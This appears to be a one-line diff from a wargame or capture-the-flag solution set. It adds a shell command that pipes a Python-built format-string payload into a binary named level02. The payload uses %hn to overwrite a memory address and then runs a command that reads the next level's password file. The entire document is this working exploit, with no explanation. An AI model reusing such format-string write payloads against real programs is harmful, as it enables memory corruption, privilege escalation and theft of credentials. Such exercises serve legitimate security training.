@@ -1,0 +1,1 @@
+./level02 < <(python -c 'print("%c" * 6 + "%2687c" + "%hn" + "/" * 78 + "\x28\x12\x60\x00\x00\x00\x00\x00" + "a" * 3989 + "cd ../level03;cat .pass\n")')
